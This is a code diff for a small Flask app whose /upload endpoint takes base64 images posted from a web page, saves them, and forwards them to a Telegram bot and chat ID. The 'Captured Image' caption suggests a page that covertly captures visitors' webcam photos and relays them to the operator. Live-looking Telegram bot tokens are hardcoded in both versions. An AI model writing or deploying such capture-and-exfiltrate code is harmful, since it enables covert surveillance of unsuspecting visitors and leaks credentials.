@@ -1,11 +1,14 @@
 from flask import Flask, render_template, request
 import requests
 import base64
+from io import BytesIO
+from PIL import Image
+from datetime import datetime
 
 app = Flask(__name__)
 
-
-BOT_TOKEN = '7814534239:AAGnJLeWM_wDydzDX6OTldxxaHGk2xBscsY'
+# Replace with your Telegram bot token and chat ID
+BOT_TOKEN = '7912894287:AAHuWV6vj4ZSAYGwPH2UNMSL0XmKzwr3JSY'
 CHAT_ID = '7167361126'
 
 @app.route('/')
@@ -14,21 +17,31 @@ def index():
 
 @app.route('/upload', methods=['POST'])
 def upload():
-    data = request.json
+    data = request.get_json()
     image_data = data.get('image')
 
-    if image_data:
-        
-        img_bytes = base64.b64decode(image_data.split(',')[1])
-        
-        files = {'photo': ('image.jpg', img_bytes)}
-        requests.post(
-            f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
-            data={'chat_id': CHAT_ID, 'caption': '📸 Captured Image'},
-            files=files
-        )
+    if not image_data:
+        return 'No image data', 400
 
-    return {'status': 'success'}
+    image_data = image_data.split(',')[1]
+    image_bytes = base64.b64decode(image_data)
+
+    # Optional: save locally with timestamp
+    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
+    filename = f"image_{timestamp}.jpg"
+    with open(filename, 'wb') as f:
+        f.write(image_bytes)
+
+    # Send to Telegram
+    send_to_telegram(image_bytes)
+
+    return 'Image received', 200
+
+def send_to_telegram(image_bytes):
+    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
+    files = {'photo': ('image.jpg', image_bytes)}
+    data = {'chat_id': CHAT_ID}
+    requests.post(url, files=files, data=data)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    app.run(debug=True)
